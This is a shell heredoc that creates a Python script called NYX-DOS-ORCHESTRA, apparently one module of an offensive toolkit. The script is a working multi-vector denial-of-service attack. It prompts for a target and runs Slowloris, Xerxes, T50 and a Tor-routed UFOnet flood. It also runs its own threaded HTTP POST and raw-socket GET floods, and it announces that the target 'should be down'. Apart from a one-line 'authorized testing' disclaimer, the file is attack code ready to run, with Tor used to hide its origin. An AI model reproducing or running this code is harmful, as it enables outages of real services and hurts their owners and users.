cat > modules/06_dos_attacks/dos_chain.py << 'EOF'
#!/usr/bin/env python3
"""
NYX-DOS-ORCHESTRA v1.0
Full Multi-Vector DoS Chain Attack
Created by ML (@malxcolm) - 2025
For authorized stress testing & penetration testing only.
"""

import os
import subprocess
import threading
import time
import random
import socket
from concurrent.futures import ThreadPoolExecutor

# Colors
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
E = "\033[0m"

banner = f"""
{R}    ╔══════════════════════════════════════════════════╗
    ║           NYX-DOS-ORCHESTRA v1.0                 ║
    ║               Created by ML (@malxcolm)          ║
    ║        Multi-Vector | Proxy-Rotated | Brutal     ║
    ╚══════════════════════════════════════════════════╝{E}
{Y}    Tools: Slowloris • Xerxes • GoldenEye • T50 • HOIC • Tor Flood{E}
"""

print(banner)

def slowloris_attack(target, port=80, connections=1000):
    print(f"{G}[+] Starting Slowloris → {connections} connections{E}")
    subprocess.Popen(["slowloris", target, "-dns", target, "-port", str(port), "-c", str(connections), "-timeout", "30"])

def xerxes_attack(target, port=80, threads=500):
    print(f"{R}[!] Launching Xerxes → {threads} threads{E}")
    subprocess.Popen(["xerxes", target, str(port), str(threads)])

def goldeneye_attack(target):
    print(f"{Y}[+] GoldenEye Layer7 POST flood → {target}{E}")
    cmd = f"python3 -c \"import requests, threading, time; \
    url = 'http://{target}'; \
    def flood(): \
        while True: \
            try: requests.post(url, data={{'flood': 'x'*10000}}) \
            except: pass \
    for i in range(300): threading.Thread(target=flood).start()\""
    subprocess.Popen(cmd, shell=True)

def t50_stress(target):
    print(f"{R}[!] T50 Mixed Packet Flood → {target}{E}")
    subprocess.Popen(["t50", target, "--flood", "-t", "1000"])

def hoic_flood(target, threads=800):
    print(f"{B}[+] HOIC-Style Python Flood → {threads} threads{E}")
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, 80))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, 80))
                s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, 80))
                s.close()
            except:
                pass
    for i in range(threads):
        threading.Thread(target=attack).start()

def tor_flood(target):
    print(f"{G}[+] Starting Tor-Rotated Anonymous Flood (UFOnet style){E}")
    subprocess.Popen(["ufonet", "--target", f"https://{target}", "--threads", "100", "--tor"])

def run_dos_chain():
    target = input(f"{Y}Target (IP or domain): {E}").strip()
    if not target:
        print(f"{R}No target. Exiting.{E}")
        return

    duration = int(input(f"{Y}Duration (seconds): {E}") or "300")
    use_tor = input(f"{Y}Use Tor + proxy rotation? (y/n): {E}").lower() == 'y'

    print(f"\n{R}[!] NYX-DOS-ORCHESTRA STARTING IN 5 SECONDS...{E}")
    time.sleep(5)

    print(f"{R}[!] FULL CHAIN ENGAGED → {target} for {duration}s{E}\n")

    # Phase 1: Slowloris (connection exhaustion)
    threading.Thread(target=slowloris_attack, args=(target,)).start()

    # Phase 2: Xerxes (raw power)
    if os.path.exists("/usr/local/bin/xerxes"):
        threading.Thread(target=xerxes_attack, args=(target,)).start()

    # Phase 3: GoldenEye + HOIC
    threading.Thread(target=goldeneye_attack, args=(target,)).start()
    threading.Thread(target=hoic_flood, args=(target, 1200)).start()

    # Phase 4: T50 (if installed)
    if os.path.exists("/usr/bin/t50"):
        threading.Thread(target=t50_stress, args=(target,)).start()

    # Phase 5: Tor flood (anonymous)
    if use_tor:
        threading.Thread(target=tor_flood, args=(target,)).start()

    print(f"{R}[!] ALL VECTORS ACTIVE. DROWNING TARGET...{E}")
    time.sleep(duration)
    print(f"{G}[+] DoS Chain Complete. Target should be down. — ML{E}")

if __name__ == "__main__":
    try:
        run_dos_chain()
    except KeyboardInterrupt:
        print(f"\n{Y}[*] DoS Chain stopped by ML.{E}")
EOF
chmod +x modules/06_dos_attacks/dos_chain.py
